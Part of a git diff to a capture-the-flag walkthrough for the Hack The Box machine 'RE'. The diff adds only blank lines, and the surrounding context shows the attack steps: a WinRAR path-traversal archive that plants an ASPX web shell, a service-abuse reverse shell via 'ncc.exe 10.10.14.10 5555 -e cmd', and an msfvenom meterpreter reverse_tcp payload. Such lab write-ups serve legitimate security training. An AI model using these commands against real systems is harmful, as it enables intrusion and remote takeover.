@@ -35,12 +35,15 @@ Let's Read what we have into "malware_dropbox", but it's empty.
 
 ### Web site 
 ![redirect](https://github.com/roughiz/RE-walktrough/blob/master/redirect.png)
+
 Let's take a look into the http site, the site redirect us to "http://reblog.htb/" , we have to add this subdomaine to hosts file '/etc/hosts'  like:
 ##### 10.10.10.144     reblog.htb
 
 ### Users
 In the path : "http://reblog.htb/2019/03/10/accounts.html" and "http://reblog.htb/2019/03/15/ghidra.html" i found some usernames:
+
 ![blog](https://github.com/roughiz/RE-walktrough/blob/master/blog.png)
+
 ###### coby
 ######  Kenny
 
@@ -427,7 +430,9 @@ $ evilWinRAR.py -o test.rar -e test.txt  -g  ../my.jpeg -p 'C:\Users\Public\Musi
 I put the test.rar in "\Users\luke\documents\ods\", And it works :
 
 ![winrar1](https://github.com/roughiz/RE-walktrough/blob/master/win1.png)
+
 We can see that the user who unrar the archive is "cam".
+
 ![winrar2](https://github.com/roughiz/RE-walktrough/blob/master/win2.png)
 
 Now i'm sure that the vuln works but how can i exec it, the idea is to upload an aspx command shell in the web path in the box (\inetpub\wwwroot\blog\about\) and execute it later at "http://reblog.htb/about/cmd.aspx", like :
@@ -435,6 +440,7 @@ Now i'm sure that the vuln works but how can i exec it, the idea is to upload an
 $ evilWinRAR.py -o exploit.rar -e cmd.aspx  -g  ../my.jpeg -p 'C:\inetpub\wwwroot\blog\about\'
 ```
 ###### Nota : php/asp shell dosen't works 
+
 ![php](https://github.com/roughiz/RE-walktrough/blob/master/php.png)
 
 Finnally an .aspx command shell from [SecLists](https://github.com/danielmiessler/SecLists)  works great: ~/SecLists/Web-Shells/FuzzDB/cmd.aspx
@@ -442,6 +448,7 @@ Finnally an .aspx command shell from [SecLists](https://github.com/danielmiessle
 
 ### Shell as "iis apppool"
 From the web command, i have a new shell as "iis apppool"
+
 ![aspx_cmd](https://github.com/roughiz/RE-walktrough/blob/master/iis_shell.png)
 
 With this new user, i tried to enumerate with a powershell [script](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) POwerUp.ps1. And i found that we can abuse a service configuration. From powershell i load the script like :
@@ -466,6 +473,7 @@ UsoSvc        C:\Users\Public\Music\ncc.exe 10.10.14.10 5555 -e cmd
 ###### Nota: we have to execute a new rev shell with the shell caught with "Invoke-ServiceAbuse", because the first one will exit (the service can't start!!) 
 
 ### Shell as system
+
 ![system](https://github.com/roughiz/RE-walktrough/blob/master/system.png)
 
 Now i tried to read the root.txt flag but i can't !! 
@@ -507,9 +515,11 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=6060 -f 
 ```
 
 We have to find a process which run by "coby" and impersonnate it like :
+
 ![meterpreter](https://github.com/roughiz/RE-walktrough/blob/master/meterpreter.png)
 
 ## Root dance
+
 ![flagroot](https://github.com/roughiz/RE-walktrough/blob/master/flagroot.png)
 
 
